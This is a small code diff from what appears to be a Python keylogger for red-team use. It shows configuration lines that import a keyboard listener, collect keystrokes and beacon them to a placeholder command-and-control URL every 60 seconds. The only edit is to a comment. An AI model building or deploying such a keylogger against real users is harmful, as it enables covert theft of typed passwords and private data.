@@ -3,7 +3,7 @@ import time
 from pynput import keyboard
 
 # Configuration
-C2_URL = 'x.x.x.x/keystrokes'#Change to the redteams server you want to beacon back to.
+C2_URL = 'x.x.x.x/keystrokes'#Change to the redteams ops_station you want to beacon back to.
 INTERVAL = 60  # Beacon interval in seconds
 
 keystrokes = []
